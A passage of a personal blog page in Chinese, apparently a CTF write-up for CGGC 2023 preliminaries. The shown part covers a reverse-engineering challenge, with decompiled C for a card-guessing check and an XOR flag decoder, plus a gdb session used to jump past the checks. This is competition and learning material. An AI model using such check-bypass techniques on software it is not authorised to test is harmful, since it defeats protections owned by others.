<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  CGGC 2023 初賽
  #


隊名: 王凡補習班
名次

這一次參賽雖然打出來的不多，但重點還是有學到很多東西，感謝@davidchen學長帶我飛，我覺得互相交流之後的這種隱形的貢獻也是很重要的


  GaoYi
  #


  Source code
  #

:::spoiler IDA main function
int __cdecl main(int argc, const char **argv, const char **envp)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&#34;+&#34; TO EXPAND]

  setvbuf(stdout, 0LL, 2LL, 0LL);
  puts(TITLE);
  puts(&#34;Welcome to the Charitable Lag Vegas!&#34;);
  puts(&#34;Anyone can participate with three million US dollars.&#34;);
  puts(&#34;You play with 52 cards with (S)pades, (C)lub, (H)earts, (D)iamond.&#34;);
  puts(&#34;[+] Game 1: Predict the first 8 cards I draw in exact order.&#34;);
  puts(&#34;[+] Input example: \&#34;C8\&#34;.&#34;);
  v47 = 0;
  for ( i = 0; i <= 7; ++i )
  {
    printf((unsigned int)&#34;Card %c: &#34;, i + 49, v3, v4, v5, v6, flag[0]);
    fgets(&amp;input[32 * i], 32LL, stdin);
    if ( !(unsigned int)isACard((__int64)&amp;input[32 * i]) )
      --v47;
  }
  for ( j = 0; j <= 7; ++j )
  {
    if ( (unsigned __int64)j_strlen_ifunc(&amp;input[32 * j]) > 1 )
    {
      v7 = j == 7 && input[224] == 'H';
      v8 = !j && input[2] == '0';
      v9 = v8 + v7;
      v10 = j == 1 && input[32] == 'S';
      v11 = v10 + v9;
      v12 = !j && input[0] == 'H';
      v13 = v12 + v11;
      v14 = j == 1 && input[33] == '2';
      v15 = v14 + v13;
      v16 = j == 4 && input[129] == '7';
      v17 = v16 + v15;
      v18 = j == 2 && input[64] == 'C';
      v19 = v18 + v17;
      v20 = j == 3 && input[96] == 'S';
      v21 = v20 + v19;
      v22 = j == 6 && input[192] == 'H';
      v23 = v22 + v21;
      v24 = j == 2 && input[65] == '8';
      v25 = v24 + v23;
      v26 = j == 3 && input[97] == '5';
      v27 = v26 + v25;
      v28 = j == 5 && input[160] == 'S';
      v29 = v28 + v27;
      v30 = j == 4 && input[128] == 'S';
      v31 = v30 + v29;
      v32 = j == 5 && input[161] == 'A';
      v33 = v32 + v31;
      v34 = j == 6 && input[193] == '2';
      v35 = v34 + v33;
      v36 = j == 7 && input[225] == 'A';
      v44 = v35 + v36;
      v47 += v35 + v36;
    }
    else
    {
      --v47;
    }
  }
  if ( v47 > 15 )
  {
    puts(&#34;[+] Stage 2: Predict the final card I draw.&#34;);
    fgets(flag, 32LL, stdin);
    if ( (unsigned int)isACard((__int64)flag)
      && (unsigned __int64)j_strlen_ifunc(flag) > 1
      && flag[0] == 'H'
      && flag[1] == '2' )
    {
      printf((unsigned int)&#34;Congrats! Here is your flag: &#34;, 32, v38, v39, v40, v41, flag[0]);
      readFlag();
      return 0;
    }
    else
    {
      puts(&#34;You failed.&#34;);
      return 0;
    }
  }
  else
  {
    puts(&#34;You failed.&#34;);
    return 0;
  }
}
:::"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/competition/cggc-2023-%E5%88%9D%E8%B3%BD/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="CGGC 2023 初賽"><meta property="og:description" content="CGGC 2023 初賽 # 隊名: 王凡補習班 名次 這一次參賽雖然打出來的不多，但重點還是有學到很多東西，感謝@davidchen學長帶我飛，我覺得互相交流之後的這種隱形的貢獻也是很重要的 GaoYi # Source code # :::spoiler IDA main function
int __cdecl main(int argc, const char **argv, const char **envp) { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&#34;+&#34; TO EXPAND] setvbuf(stdout, 0LL, 2LL, 0LL); puts(TITLE); puts(&#34;Welcome to the Charitable Lag Vegas!&#34;); puts(&#34;Anyone can participate with three million US dollars.&#34;); puts(&#34;You play with 52 cards with (S)pades, (C)lub, (H)earts, (D)iamond.&#34;); puts(&#34;[+] Game 1: Predict the first 8 cards I draw in exact order.&#34;); puts(&#34;[+] Input example: \&#34;C8\&#34;.&#34;); v47 = 0; for ( i = 0; i <= 7; ++i ) { printf((unsigned int)&#34;Card %c: &#34;, i + 49, v3, v4, v5, v6, flag[0]); fgets(&amp;input[32 * i], 32LL, stdin); if ( !(unsigned int)isACard((__int64)&amp;input[32 * i]) ) --v47; } for ( j = 0; j <= 7; ++j ) { if ( (unsigned __int64)j_strlen_ifunc(&amp;input[32 * j]) > 1 ) { v7 = j == 7 && input[224] == 'H'; v8 = !j && input[2] == '0'; v9 = v8 + v7; v10 = j == 1 && input[32] == 'S'; v11 = v10 + v9; v12 = !j && input[0] == 'H'; v13 = v12 + v11; v14 = j == 1 && input[33] == '2'; v15 = v14 + v13; v16 = j == 4 && input[129] == '7'; v17 = v16 + v15; v18 = j == 2 && input[64] == 'C'; v19 = v18 + v17; v20 = j == 3 && input[96] == 'S'; v21 = v20 + v19; v22 = j == 6 && input[192] == 'H'; v23 = v22 + v21; v24 = j == 2 && input[65] == '8'; v25 = v24 + v23; v26 = j == 3 && input[97] == '5'; v27 = v26 + v25; v28 = j == 5 && input[160] == 'S'; v29 = v28 + v27; v30 = j == 4 && input[128] == 'S'; v31 = v30 + v29; v32 = j == 5 && input[161] == 'A'; v33 = v32 + v31; v34 = j == 6 && input[193] == '2'; v35 = v34 + v33; v36 = j == 7 && input[225] == 'A'; v44 = v35 + v36; v47 += v35 + v36; } else { --v47; } } if ( v47 > 15 ) { puts(&#34;[+] Stage 2: Predict the final card I draw.&#34;); fgets(flag, 32LL, stdin); if ( (unsigned int)isACard((__int64)flag) && (unsigned __int64)j_strlen_ifunc(flag) > 1 && flag[0] == 'H' && flag[1] == '2' ) { printf((unsigned int)&#34;Congrats! Here is your flag: &#34;, 32, v38, v39, v40, v41, flag[0]); readFlag(); return 0; } else { puts(&#34;You failed.&#34;); return 0; } } else { puts(&#34;You failed.&#34;); return 0; } } :::"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="CGGC"><title>CGGC 2023 初賽 | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/competition/cggc-2023-%E5%88%9D%E8%B3%BD/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>CGGC 2023 初賽</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#gaoyi>GaoYi</a><ul><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li></ul></li><li><a href=#space-game>Space game</a><ul><li><a href=#recon-1>Recon</a></li><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#bossti>Bossti</a><ul><li><a href=#background>Background</a></li><li><a href=#source-code-1>Source code</a></li><li><a href=#recon-2>Recon</a></li><li><a href=#exploit---ssti>Exploit - SSTI</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=cggc-2023-初賽>CGGC 2023 初賽
<a class=anchor href=#cggc-2023-%e5%88%9d%e8%b3%bd>#</a></h1><ul><li>隊名: 王凡補習班</li><li>名次
<img src=https://hackmd.io/_uploads/ryb_H_FrT.png alt=圖片>
這一次參賽雖然打出來的不多，但重點還是有學到很多東西，感謝@davidchen學長帶我飛，我覺得互相交流之後的這種隱形的貢獻也是很重要的</li></ul><h2 id=gaoyi>GaoYi
<a class=anchor href=#gaoyi>#</a></h2><h3 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h3><p>:::spoiler IDA main function</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#66d9ef>__cdecl</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#75715e>// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&#34;+&#34; TO EXPAND]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  setvbuf(stdout, <span style=color:#ae81ff>0LL</span>, <span style=color:#ae81ff>2LL</span>, <span style=color:#ae81ff>0LL</span>);
</span></span><span style=display:flex><span>  puts(TITLE);
</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Welcome to the Charitable Lag Vegas!&#34;</span>);
</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Anyone can participate with three million US dollars.&#34;</span>);
</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;You play with 52 cards with (S)pades, (C)lub, (H)earts, (D)iamond.&#34;</span>);
</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;[+] Game 1: Predict the first 8 cards I draw in exact order.&#34;</span>);
</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;[+] Input example: </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>C8</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>.&#34;</span>);
</span></span><span style=display:flex><span>  v47 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> ( i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>7</span>; <span style=color:#f92672>++</span>i )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    printf((<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)<span style=color:#e6db74>&#34;Card %c: &#34;</span>, i <span style=color:#f92672>+</span> <span style=color:#ae81ff>49</span>, v3, v4, v5, v6, flag[<span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>    fgets(<span style=color:#f92672>&amp;</span>input[<span style=color:#ae81ff>32</span> <span style=color:#f92672>*</span> i], <span style=color:#ae81ff>32LL</span>, stdin);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)isACard((<span style=color:#66d9ef>__int64</span>)<span style=color:#f92672>&amp;</span>input[<span style=color:#ae81ff>32</span> <span style=color:#f92672>*</span> i]) )
</span></span><span style=display:flex><span>      <span style=color:#f92672>--</span>v47;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> ( j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>7</span>; <span style=color:#f92672>++</span>j )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span>)j_strlen_ifunc(<span style=color:#f92672>&amp;</span>input[<span style=color:#ae81ff>32</span> <span style=color:#f92672>*</span> j]) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v7 <span style=color:#f92672>=</span> j <span style=color:#f92672>==</span> <span style=color:#ae81ff>7</span> <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>224</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;H&#39;</span>;
</span></span><span style=display:flex><span>      v8 <span style=color:#f92672>=</span> <span style=color:#f92672>!</span>j <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;0&#39;</span>;
</span></span><span style=display:flex><span>      v9 <span style=color:#f92672>=</span> v8 <span style=color:#f92672>+</span> v7;
</span></span><span style=display:flex><span>      v10 <span style=color:#f92672>=</span> j <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>32</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;S&#39;</span>;
</span></span><span style=display:flex><span>      v11 <span style=color:#f92672>=</span> v10 <span style=color:#f92672>+</span> v9;
</span></span><span style=display:flex><span>      v12 <span style=color:#f92672>=</span> <span style=color:#f92672>!</span>j <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;H&#39;</span>;
</span></span><span style=display:flex><span>      v13 <span style=color:#f92672>=</span> v12 <span style=color:#f92672>+</span> v11;
</span></span><span style=display:flex><span>      v14 <span style=color:#f92672>=</span> j <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>33</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;2&#39;</span>;
</span></span><span style=display:flex><span>      v15 <span style=color:#f92672>=</span> v14 <span style=color:#f92672>+</span> v13;
</span></span><span style=display:flex><span>      v16 <span style=color:#f92672>=</span> j <span style=color:#f92672>==</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>129</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;7&#39;</span>;
</span></span><span style=display:flex><span>      v17 <span style=color:#f92672>=</span> v16 <span style=color:#f92672>+</span> v15;
</span></span><span style=display:flex><span>      v18 <span style=color:#f92672>=</span> j <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>64</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;C&#39;</span>;
</span></span><span style=display:flex><span>      v19 <span style=color:#f92672>=</span> v18 <span style=color:#f92672>+</span> v17;
</span></span><span style=display:flex><span>      v20 <span style=color:#f92672>=</span> j <span style=color:#f92672>==</span> <span style=color:#ae81ff>3</span> <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>96</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;S&#39;</span>;
</span></span><span style=display:flex><span>      v21 <span style=color:#f92672>=</span> v20 <span style=color:#f92672>+</span> v19;
</span></span><span style=display:flex><span>      v22 <span style=color:#f92672>=</span> j <span style=color:#f92672>==</span> <span style=color:#ae81ff>6</span> <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>192</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;H&#39;</span>;
</span></span><span style=display:flex><span>      v23 <span style=color:#f92672>=</span> v22 <span style=color:#f92672>+</span> v21;
</span></span><span style=display:flex><span>      v24 <span style=color:#f92672>=</span> j <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>65</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;8&#39;</span>;
</span></span><span style=display:flex><span>      v25 <span style=color:#f92672>=</span> v24 <span style=color:#f92672>+</span> v23;
</span></span><span style=display:flex><span>      v26 <span style=color:#f92672>=</span> j <span style=color:#f92672>==</span> <span style=color:#ae81ff>3</span> <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>97</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;5&#39;</span>;
</span></span><span style=display:flex><span>      v27 <span style=color:#f92672>=</span> v26 <span style=color:#f92672>+</span> v25;
</span></span><span style=display:flex><span>      v28 <span style=color:#f92672>=</span> j <span style=color:#f92672>==</span> <span style=color:#ae81ff>5</span> <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>160</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;S&#39;</span>;
</span></span><span style=display:flex><span>      v29 <span style=color:#f92672>=</span> v28 <span style=color:#f92672>+</span> v27;
</span></span><span style=display:flex><span>      v30 <span style=color:#f92672>=</span> j <span style=color:#f92672>==</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>128</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;S&#39;</span>;
</span></span><span style=display:flex><span>      v31 <span style=color:#f92672>=</span> v30 <span style=color:#f92672>+</span> v29;
</span></span><span style=display:flex><span>      v32 <span style=color:#f92672>=</span> j <span style=color:#f92672>==</span> <span style=color:#ae81ff>5</span> <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>161</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;A&#39;</span>;
</span></span><span style=display:flex><span>      v33 <span style=color:#f92672>=</span> v32 <span style=color:#f92672>+</span> v31;
</span></span><span style=display:flex><span>      v34 <span style=color:#f92672>=</span> j <span style=color:#f92672>==</span> <span style=color:#ae81ff>6</span> <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>193</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;2&#39;</span>;
</span></span><span style=display:flex><span>      v35 <span style=color:#f92672>=</span> v34 <span style=color:#f92672>+</span> v33;
</span></span><span style=display:flex><span>      v36 <span style=color:#f92672>=</span> j <span style=color:#f92672>==</span> <span style=color:#ae81ff>7</span> <span style=color:#f92672>&amp;&amp;</span> input[<span style=color:#ae81ff>225</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;A&#39;</span>;
</span></span><span style=display:flex><span>      v44 <span style=color:#f92672>=</span> v35 <span style=color:#f92672>+</span> v36;
</span></span><span style=display:flex><span>      v47 <span style=color:#f92672>+=</span> v35 <span style=color:#f92672>+</span> v36;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#f92672>--</span>v47;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( v47 <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>15</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;[+] Stage 2: Predict the final card I draw.&#34;</span>);
</span></span><span style=display:flex><span>    fgets(flag, <span style=color:#ae81ff>32LL</span>, stdin);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)isACard((<span style=color:#66d9ef>__int64</span>)flag)
</span></span><span style=display:flex><span>      <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span>)j_strlen_ifunc(flag) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&amp;&amp;</span> flag[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;H&#39;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&amp;&amp;</span> flag[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;2&#39;</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      printf((<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)<span style=color:#e6db74>&#34;Congrats! Here is your flag: &#34;</span>, <span style=color:#ae81ff>32</span>, v38, v39, v40, v41, flag[<span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>      readFlag();
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      puts(<span style=color:#e6db74>&#34;You failed.&#34;</span>);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;You failed.&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><p>:::spoiler IDA ReadFlag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>readFlag</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>__int64</span> v0[<span style=color:#ae81ff>3</span>]; <span style=color:#75715e>// [rsp+0h] [rbp-40h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  _DWORD v1[<span style=color:#ae81ff>3</span>]; <span style=color:#75715e>// [rsp+18h] [rbp-28h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> v2; <span style=color:#75715e>// [rsp+24h] [rbp-1Ch]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v3; <span style=color:#75715e>// [rsp+38h] [rbp-8h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v4; <span style=color:#75715e>// [rsp+3Ch] [rbp-4h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  v0[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#960050;background-color:#1e0010>&#39;\</span>xD8<span style=color:#960050;background-color:#1e0010>\</span>xD8<span style=color:#960050;background-color:#1e0010>\</span>xA2<span style=color:#960050;background-color:#1e0010>\</span>x93<span style=color:#960050;background-color:#1e0010>\</span>xAB<span style=color:#960050;background-color:#1e0010>\</span>xAF<span style=color:#960050;background-color:#1e0010>\</span>xAF<span style=color:#960050;background-color:#1e0010>\</span>xAB<span style=color:#960050;background-color:#1e0010>&#39;</span>;
</span></span><span style=display:flex><span>  v0[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#960050;background-color:#1e0010>&#39;\</span>x86<span style=color:#960050;background-color:#1e0010>\</span>xB7<span style=color:#960050;background-color:#1e0010>\</span>x84<span style=color:#960050;background-color:#1e0010>\</span>x84<span style=color:#960050;background-color:#1e0010>\</span>xDC<span style=color:#960050;background-color:#1e0010>\</span>x80<span style=color:#960050;background-color:#1e0010>\</span>x9B<span style=color:#960050;background-color:#1e0010>\</span>xB7<span style=color:#960050;background-color:#1e0010>&#39;</span>;
</span></span><span style=display:flex><span>  v0[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> <span style=color:#960050;background-color:#1e0010>&#39;\</span>xB7<span style=color:#960050;background-color:#1e0010>\</span>xB8<span style=color:#960050;background-color:#1e0010>\</span>xD9<span style=color:#960050;background-color:#1e0010>\</span>xA0<span style=color:#960050;background-color:#1e0010>\</span>x9B<span style=color:#960050;background-color:#1e0010>\</span>xB7<span style=color:#960050;background-color:#1e0010>\</span>xDF<span style=color:#960050;background-color:#1e0010>\</span>xD8<span style=color:#960050;background-color:#1e0010>&#39;</span>;
</span></span><span style=display:flex><span>  v1[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#960050;background-color:#1e0010>&#39;\</span>xBA<span style=color:#960050;background-color:#1e0010>\</span>x8B<span style=color:#960050;background-color:#1e0010>\</span>xDB<span style=color:#960050;background-color:#1e0010>\</span>xBB<span style=color:#960050;background-color:#1e0010>&#39;</span>;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>(_QWORD <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>v1[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x8BB7D8DFB7BBDFDBLL</span>;
</span></span><span style=display:flex><span>  v2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x959ADBA5D8DFBB9DLL</span>;
</span></span><span style=display:flex><span>  v4 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  v3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> ( v4 <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>44</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v3 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)v0 <span style=color:#f92672>+</span> v4);
</span></span><span style=display:flex><span>    v3 <span style=color:#f92672>^=</span> <span style=color:#ae81ff>0xC1E8u</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>((_BYTE <span style=color:#f92672>*</span>)v0 <span style=color:#f92672>+</span> v4<span style=color:#f92672>++</span>) <span style=color:#f92672>=</span> v3;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  puts(v0);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><h3 id=recon>Recon
<a class=anchor href=#recon>#</a></h3><p>這一題算是除了hello world以外最水的題目了吧，主要是模擬賭神中和高義對決的場警</p><ol><li>主要的source code行為是，他已經寫死8張牌，第一階段我們要做的事情是猜出是哪八張</li><li>第二階段是再猜出一張牌</li><li>就可以進到readFlag function中，讓他把flag給我們</li></ol><p>但其實實際上可以用gdb bypass那些認證，直接jump就好</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ gdb goayi
</span></span><span style=display:flex><span>gef➤  r
</span></span><span style=display:flex><span>Starting program: /mnt/d/NTU/CTF/CGGC 2023/Reverse/GaoYi/gaoyi
</span></span><span style=display:flex><span>                        .<span style=color:#f92672>(&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>&amp;@,
</span></span><span style=display:flex><span>                   .@<span style=color:#f92672>&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>/#<span style=color:#f92672>&amp;&amp;(&amp;&amp;</span>&amp;%.
</span></span><span style=display:flex><span>                 <span style=color:#f92672>&amp;&amp;&amp;&amp;</span>&amp;@@&amp;<span style=color:#75715e>#%@&amp;&amp;&amp;&amp;&amp;#&amp;&amp;&amp;&amp;&amp;&amp;@</span>
</span></span><span style=display:flex><span>                &amp;%<span style=color:#f92672>&amp;&amp;</span><span style=color:#75715e>#&amp;&amp;@%#,,*///,,*#&amp;&amp;&amp;&amp;&amp;&amp;</span>
</span></span><span style=display:flex><span>                @<span style=color:#f92672>&amp;&amp;</span>................/%<span style=color:#f92672>&amp;&amp;&amp;&amp;</span>&amp;
</span></span><span style=display:flex><span>                <span style=color:#f92672>&amp;&amp;</span>/,................/%<span style=color:#f92672>&amp;&amp;&amp;&amp;</span>.
</span></span><span style=display:flex><span>                &amp;@*#/,......*&amp;<span style=color:#f92672>(</span>..,,,.,*%<span style=color:#f92672>&amp;&amp;</span>
</span></span><span style=display:flex><span>                /&amp;,*/&amp;/.*....//&amp;*/,..,,<span style=color:#f92672>&amp;&amp;</span>.
</span></span><span style=display:flex><span>                *&amp;,,,.../..,.........***.,
</span></span><span style=display:flex><span>                .<span style=color:#f92672>(</span>,..../..,,,......,,***.%
</span></span><span style=display:flex><span>                .//*..,,,*........,,,,**&amp;.
</span></span><span style=display:flex><span>                 */**,,,,..,,/*...,.,*/*&amp;@
</span></span><span style=display:flex><span>        &amp;%#########&amp;@*..,,*,.....,,*/*,.%&amp;<span style=color:#75715e>#&amp;@</span>
